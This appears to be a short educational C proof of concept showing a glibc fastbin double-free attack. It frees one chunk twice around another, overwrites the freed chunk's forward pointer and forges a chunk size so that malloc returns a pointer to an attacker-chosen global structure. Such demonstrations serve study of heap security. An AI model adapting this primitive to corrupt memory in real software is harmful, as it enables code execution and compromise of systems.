//double-free-ptr2.c
#include <stdio.h>
#include <stdlib.h>

struct 
{
    int mchunk_prev_size;
    int mchunk_size;
}fake_chunk;

void main()
{
    int i;
    void *a, *b;
    
    printf("&fake_chunk=%p\n", &fake_chunk);
    
    a = malloc(16);
    b = malloc(16);
      
    free(a);
    free(b); //bypass fasttop
    free(a); //double free
    
    void *c = malloc(16); // returns a
    
    malloc(16);  // returns b
    
    // Write address of target in fwd pointer
    *(int*)a = (int)&fake_chunk;
    
    // Bypass memory corruption (fast)
    fake_chunk.mchunk_size = 24;
    
    malloc(16); // returns a again
    
    printf("Trying to return a pointer to fake_chunk\n");
    printf("malloc(16)=%p\n", malloc(16));
}